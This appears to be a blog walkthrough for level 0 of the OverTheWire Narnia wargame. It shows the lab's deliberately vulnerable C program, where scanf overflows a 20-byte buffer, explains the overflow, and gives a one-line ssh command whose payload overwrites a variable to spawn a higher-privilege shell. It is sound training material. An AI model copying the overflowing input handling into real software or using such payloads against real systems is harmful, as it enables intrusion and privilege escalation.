---
title: Overthewire Narnia Walkthrough
date: 2023-09-19
excerpt: Let's have some fun ;)
permalink: overthewire-narnia-walkthrough
---

## Narnia 0
In `/narnia/narnia0.c` we can find the source code of `/narnia/narnia0`

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

And it's a simple stack overflow bug because `buf` only has 20 bytes and `scanf` will read 24 bytes into where `buf` starts. And the extra 4 bytes will overwrite the value in `val`.

Therefore, we can do a oneliner as follows to get shell

```bash
ssh -p 2226 narnia0@narnia.labs.overthewire.org bash -c "\"(echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde' && cat) | /narnia/narnia0\""
```

Now once we type the password of narnia0, `/narnia/narnia0` will send us to a sub-shell and we should be `narnia1` in this new shell.

![Get Shell](assets/narnia0.png)
